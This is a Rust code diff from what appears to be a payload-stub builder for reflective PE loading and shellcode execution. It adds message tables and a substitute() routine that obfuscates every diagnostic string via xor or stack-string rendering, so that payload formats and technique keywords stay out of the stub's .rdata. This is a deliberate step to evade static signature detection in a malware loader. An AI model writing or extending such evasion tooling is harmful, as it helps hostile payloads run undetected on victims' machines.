@@ -53,11 +53,85 @@ pub const DEF: TechniqueDef = TechniqueDef {
 /// a PE mapper. Rendered when `build.payloads.<name>.format: shellcode`.
 pub const SHELLCODE_FRAGMENT: &str = include_str!("stub_fragment_shellcode.rs");
 
+/// Runtime diagnostics the PE mapper can emit, as `(placeholder, plaintext)`
+/// pairs.
+///
+/// The renderer replaces each placeholder with code that rebuilds the message at
+/// runtime, so no diagnostic text — least of all the payload format or a
+/// technique keyword — lands in the generated stub's `.rdata`. Messages that
+/// interpolate a value keep a keyword-free `format!`/helper call at the site
+/// (`format!` cannot take a runtime format string).
+const MESSAGES: &[(&str, &str)] = &[
+    ("$MSG_FILE_TOO_SMALL$", "file too small to be a valid PE"),
+    ("$MSG_INVALID_DOS$", "invalid DOS signature (expected MZ)"),
+    ("$MSG_INVALID_NT$", "invalid NT signature (expected PE)"),
+    (
+        "$MSG_UNSUPPORTED_ARCH$",
+        "the payload's architecture does not match the stub's",
+    ),
+    ("$MSG_ALLOCATE_FAILED$", "failed to allocate image memory"),
+    (
+        "$MSG_SECTION_OUT_OF_BOUNDS$",
+        "section is out of file bounds",
+    ),
+    (
+        "$MSG_VIRTUAL_PROTECT_FAILED$",
+        "could not change protection for a section",
+    ),
+    (
+        "$MSG_TLS_UNAVAILABLE$",
+        "could not provision the payload's TLS (no index or no memory)",
+    ),
+    (
+        "$MSG_EXPORT_NOT_FOUND$",
+        "the payload does not export a requested symbol",
+    ),
+];
+
+/// Runtime diagnostics the shellcode runner can emit, as `(placeholder,
+/// plaintext)` pairs. Distinct tokens from [`MESSAGES`] so the two fragments
+/// never substitute each other's placeholders.
+const SHELLCODE_MESSAGES: &[(&str, &str)] = &[
+    ("$MSG_SHELLCODE_EMPTY$", "the payload is empty"),
+    (
+        "$MSG_SHELLCODE_ALLOCATE_FAILED$",
+        "could not allocate executable memory",
+    ),
+    (
+        "$MSG_SHELLCODE_THREAD_FAILED$",
+        "could not create the execution thread",
+    ),
+];
+
+/// Replaces each `(placeholder, plaintext)` pair in `text` with code that
+/// rebuilds the message at runtime under `strings`'s active strategy.
+///
+/// `var_prefix` names the stack-strategy temporary for each message (ignored by
+/// the xor strategy); the two fragments pass distinct prefixes so nothing
+/// collides if a stub ever contains both.
+fn substitute(
+    text: String,
+    messages: &[(&str, &str)],
+    strings: &StringsConfig,
+    var_prefix: &str,
+) -> String {
+    let mut rendered = text;
+    for (index, (placeholder, message)) in messages.iter().enumerate() {
+        rendered = rendered.replace(
+            placeholder,
+            &strings
+                .obfuscate(message)
+                .render_stub_expr(&format!("{var_prefix}{index}")),
+        );
+    }
+    rendered
+}
+
 impl Params {
     /// Renders the reflective-loading stub fragment (no per-build parameters,
-    /// so `strings` is unused here).
-    pub fn render_fragment(&self, _strings: &StringsConfig) -> String {
-        DEF.stub_fragment.to_string()
+    /// so `strings` only feeds the obfuscated diagnostics).
+    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
+        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_")
     }
 
     /// Renders the fragment that matches the payload's binary format.
@@ -72,7 +146,12 @@ impl Params {
         export: Option<&str>,
     ) -> String {
         if !format.is_pe_image() {
-            return SHELLCODE_FRAGMENT.to_string();
+            return substitute(
+                SHELLCODE_FRAGMENT.to_string(),
+                SHELLCODE_MESSAGES,
+                strings,
+                "sc_msg_",
+            );
         }
 
         let export_def = match export {
